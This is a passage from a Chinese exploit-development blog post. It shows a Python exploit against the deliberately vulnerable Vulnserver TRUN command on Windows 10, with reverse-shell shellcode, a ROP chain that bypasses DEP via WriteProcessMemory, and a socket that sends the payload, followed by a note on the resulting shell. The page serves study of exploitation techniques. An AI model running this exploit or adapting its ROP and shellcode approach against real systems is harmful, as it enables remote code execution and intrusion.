class="string">b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"</span></span><br><span class="line">    shellcode += <span class="string">b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"</span></span><br><span class="line">    shellcode += <span class="string">b"\x6a\x00\x53\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">    pos = mapBadChars(shellcode)</span><br><span class="line">    print(pos)</span><br><span class="line">    encodedRevShell = encodeShellcode(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    func  = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x45454545</span>)     <span class="comment"># WriteProcessMemory Address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Shellcode Return Address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xFFFFFFFF</span>)     <span class="comment"># pseudo Process handle</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Code cave address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy lpBuffer (Stack address) </span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy nSize</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62502028</span>)     <span class="comment"># lpNumberOfBytesWritten</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    eip   = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501022</span>)     <span class="comment"># retn   essfunc.dll</span></span><br><span class="line">    <span class="comment"># save ESP to ESI,EDX,EAX</span></span><br><span class="line">    rop1  = struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755912d6</span>)    <span class="comment"># PUSH ESP # POP ESI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755b671f</span>)    <span class="comment"># MOV EDX,ESI # POP ESI # RETN 0x04    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7728bdf4</span>)    <span class="comment"># MOV EAX,EDX # POP ESI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching dummy lpBuffer</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x88888888</span>)    <span class="comment"># 0x88888888</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7777798c</span>)      <span class="comment"># 0x7777798c</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758fe636</span>)    <span class="comment"># MOV EAX,EDX # RETN  </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN </span></span><br><span class="line">    </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching dummy nSize</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffffdf4</span>)    <span class="comment"># 0xfffffdf4</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN  </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching  WriteProcessMemory Address</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x62506090</span>)    <span class="comment"># IAT 62506090  AddAtomA KERNEL32 </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75fd7518</span>)    <span class="comment"># XCHG EAX,DWORD PTR [ECX] # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7557771b</span>)    <span class="comment"># POP EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffd9df0</span>)    <span class="comment"># 0xfffd9df0</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN   </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># save current EAX to EBX</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7730e63c</span>)    <span class="comment"># XCHG EAX,ESI # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75f84c67</span>)    <span class="comment"># MOV EAX,ESI # RETN</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Align EAX with shellcode</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffffd78</span>)    <span class="comment"># 0n648</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772974e4</span>)    <span class="comment"># SUB EAX,ECX # RETN    ** [ntdll.dll] ** </span></span><br><span class="line"></span><br><span class="line">    rop1 += decodeShellcode(<span class="number">0</span>, pos, shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Align ESP with ROP Skeleton</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7730e63c</span>)    <span class="comment"># XCHG EAX,ESI # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f2002</span>)    <span class="comment"># XCHG EAX,ESP # RETN    </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># padding = b"C" * (3000-2006-32-len(rop1)-len(shellcode))</span></span><br><span class="line">    padding = <span class="string">b"\x44"</span> * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    PAYLOAD = (</span><br><span class="line">        <span class="string">b'TRUN .'</span> +</span><br><span class="line">        <span class="string">b'A'</span> * (<span class="number">2006</span>-len(func)) +</span><br><span class="line">        func +</span><br><span class="line">        eip +</span><br><span class="line">        rop1 + </span><br><span class="line">        <span class="string">b"\x90"</span>*<span class="number">80</span>+</span><br><span class="line">        encodedRevShell+</span><br><span class="line">        padding</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((HOST, PORT)) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.sendall(PAYLOAD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>喜闻乐见的反弹<code>shell</code>如下：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/21.png" alt="BOF"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>n0maj1o24
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/" title="Vulnserver TRUN Bypass DEP With ROP On Win10 II">https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+              <a href="/tags/Stack-Based-Overflows/" rel="tag"># Stack Based Overflows</a>
+              <a href="/tags/DEP/" rel="tag"># DEP</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/" rel="prev" title="Sync Breeze 10.0.28 bypass DEP">
+      <i class="fa fa-chevron-left"></i> Sync Breeze 10.0.28 bypass DEP
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="n0maj1o24"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">n0maj1o24</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/n0maj1o24" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;n0maj1o24" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">n0maj1o24</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'YxcX5Cznyp28BYsOhkgW4VH2-gzGzoHsz',
+      appKey     : 'DNYhYDu0OfL5c9gaMjQ1vbNC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
